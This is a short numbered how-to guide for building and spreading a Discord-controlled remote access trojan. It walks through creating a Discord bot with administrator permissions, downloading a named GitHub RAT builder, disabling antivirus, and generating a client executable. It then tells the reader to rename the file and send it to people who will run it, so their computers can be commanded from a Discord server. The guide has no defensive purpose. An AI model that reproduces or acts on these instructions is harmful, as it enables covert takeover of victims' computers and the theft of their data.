1. Create a bot here: https://discord.com/developers/applications
 
 
2. Hit "New application" at the top right side of your screen and name it whatever you want.
 
 
3. On the left side where it says setting, go to bot and reset your bot token. Copy the token and paste it into a notepad. While still being on Bot, scroll down a little and enable all 3 privileged Gateway Intents.
 
 
4. Head to OAuth2 and go to "url generator". Then enable bot and then administrator.
 
 
5. While you are still there, copy the Generated URL and paste it into the same notepad where you pasted your bot token.
 
 
6. Now that that's out of the way, go to this github page: https://github.com/DhritimoyDas/DiscordRAT_Build
 
 
7. Disable antivirus because of false positives and download the zip.
 
 
8. Extract it and run builder.exe.
 
 
9. Then take the bot token you pasted on your notepad and put it into the bot token section of the new application that popped up on your screen.
 
 
10. Create a server and delete every channel except #general.
 
 
11. Take your server ID and paste it into the Guild ID.
 
 
12. Before building it, take the Url generated thing on your notepad not the bot token and paste it into your choice of search browser.
 
 
13. Add the bot to the server you created and hit continue.
 
 
14. If you see the bot in general, delete general and hit build on the .exe you ran earlier.
 
 
15. When you are done, there should be another.exe file named Client-build.exe.
 
 
16. Change that .exe name to whatever you want and send that mf out to people who'll execute it.
 
 
17. When someone executes it, a session should appear on the Discord server you created.
 
 
18. Type !help, and it'll give you all the commands you can run on that computer.
